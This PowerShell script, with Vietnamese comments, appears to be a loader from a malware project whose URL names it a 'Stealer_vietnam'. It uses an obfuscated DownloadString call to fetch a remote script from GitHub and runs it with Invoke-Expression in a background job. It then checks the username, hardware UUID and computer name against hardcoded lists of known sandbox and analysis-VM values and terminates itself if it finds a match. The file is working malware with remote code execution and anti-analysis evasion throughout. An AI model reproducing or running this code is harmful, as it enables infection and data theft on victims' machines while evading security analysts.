$skibiditoilet = "https://raw.githubusercontent.com/s1uiasdad/Stealer_vietnam/main/file/taskkill.ps1"
$dopdopyesyes = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$skibiditoilet')"

# Tạo script block để thực thi script từ URL
$scriptBlock = {
    param ($url, $code)
    Invoke-Expression $code
}

# Chạy script block trong job
Start-Job -ScriptBlock $scriptBlock -ArgumentList $skibiditoilet, $dopdopyesyes

# Lấy thông tin User
$user = $env:username

# Lấy UUID sử dụng Win32_ComputerSystemProduct
$uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID

# Lấy tên máy tính
$computerName = $env:COMPUTERNAME

# URL chứa danh sách từ GitHub

# Tải nội dung của file từ GitHub
$uuidvm = ('7AB5C494-39F5-4941-9163-47F54D6D5016', '032E02B4-0499-05C3-0806-3C0700080009', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FE822042-A70C-D08B-F1D1-C207055A488F', '76122042-C286-FA81-F0A8-514CC507B250', '481E2042-A1AF-D390-CE06-A8F783B1E76A', 'F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C', '9961A120-E691-4FFE-B67B-F0E4115D5919')
$domain = ('bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh', 'xc64zb', 'desktop-d019gdm', 'desktop-wi8clet', 'server1', 'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29', 'desktop-1y2433r', 'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez', 'desktop-5ov9s0o', 'qarzhrdbpj', 'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'compname_5076', 'desktop-vkeons4', 'NTT-EFF-2W11WSS') 
$uservm = ('wdagutilityaccount', 'abby', 'peter wilson', 'hmarc', 'patex', 'john-pc', 'rdhj0cnfevzx', 'keecfmwgj', 'frank', '8nl0colnq5bq', 'lisa', 'john', 'george', 'pxmduopvyx', '8vizsm', 'w0fjuovmccp5a', 'lmvwjj9b', 'pqonjhvwexss', '3u2v9m8', 'julia', 'heuerzl', 'harry johnson', 'j.seance', 'a.monaldo', 'tvm')

# Khởi tạo biến để chứa thông báo trùng
$matchMessage = ""

# Kiểm tra nếu User có trong nội dung file
if ($uservm -like "*$user*") {
    $matchMessage += "User trùng: $user`n"
}

# Kiểm tra nếu UUID có trong nội dung file
if ($uuidvm -like "*$uuid*") {
    $matchMessage += "UUID trùng: $uuid`n"
}

# Kiểm tra nếu Computer Name có trong nội dung file
if ($domain -like "*$computerName*") {
    $matchMessage += "Computer Name trùng: $computerName`n"
}

# In thông báo nếu có trùng
if ($matchMessage) {
    Stop-Process $pid -Force
} else {
    Write-Output "User: $user"
    Write-Output "UUID: $uuid"
    Write-Output "Computer Name: $computerName"
}
# kill những ứng dụng :)
